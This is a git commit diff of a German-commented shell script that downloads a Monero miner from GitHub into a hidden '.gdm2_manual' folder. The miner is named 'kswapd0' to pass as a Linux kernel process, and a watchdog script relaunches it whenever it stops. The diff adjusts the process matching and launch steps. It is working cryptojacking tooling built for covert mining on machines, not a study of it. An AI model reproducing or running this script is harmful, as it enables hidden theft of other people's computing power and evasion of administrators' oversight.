1cc898f20396b1c18717072d283fd5c4b3fdfae9
Acen <113854209+littlAcen@users.noreply.github.com>
2024-06-05 18:00:49 +0200

    Update setup_gdm2_manual.sh

--- setup_gdm2_manual.sh
+++ setup_gdm2_manual.sh
@@ -2,16 +2,17 @@
 
 # Skript um Monero Ocean Miner zu starten und Dateien zu verwalten
 
+# Verzeichnis für die Dateien erstellen
 mkdir -p "$HOME/.gdm2_manual/"
 
 # Pfade zu den benötigten Dateien
 KSWAPD0="$HOME/.gdm2_manual/kswapd0"
 CONFIG_JSON="$HOME/.gdm2_manual/config.json"
 
-# Prozesse beenden, die mit kswapd0 verbunden sind
-pkill -f "$KSWAPD0"
+# Prozesse beenden, die mit dem spezifischen kswapd0 verbunden sind
+pkill -f "$KSWAPD0 --config=$CONFIG_JSON"
 
-# Überprüfen, ob die Dateien existieren und starten, wenn sie existieren
+# Überprüfen, ob die Dateien existieren und herunterladen, falls nicht
 if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
     echo "kswapd0 existiert und ist ausführbar."
 else
@@ -27,31 +28,25 @@ else
     wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
-# Dateien entfernen, falls sie existieren
-rm -f "$CONFIG_JSON" "$KSWAPD0"
-
-# Nochmal überprüfen und erneut herunterladen, falls entfernt
-if [ ! -f "$KSWAPD0" ]; then
-    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
-    chmod +x "$KSWAPD0"
+# kswapd0 ausführen, wenn kein anderer Prozess mit der spezifischen Konfiguration läuft
+if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
+    echo "kswapd0 nicht gestartet. Starte es..."
+    "$KSWAPD0" --config="$CONFIG_JSON" &
+else
+    echo "kswapd0 läuft bereits."
 fi
-
-if [ ! -f "$CONFIG_JSON" ]; then
-    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-fi
-
-# kswapd0 ausführen
-"$KSWAPD0" --config="$CONFIG_JSON" &
 
 # Überprüfungsskript erstellen
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
 #!/bin/bash
 
 KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
+CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"
 
-if ! pgrep -f "$KSWAPD0_PATH" > /dev/null; then
+if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
     echo "kswapd0 not started. Going to start it..."
-    "$HOME/.gdm2_manual/kswapd0 --config=config.json &"
+    cd "$HOME/.gdm2_manual/" || exit
+    ./kswapd0 --config=config.json &
 else
     echo "kswapd0 already started."
 fi
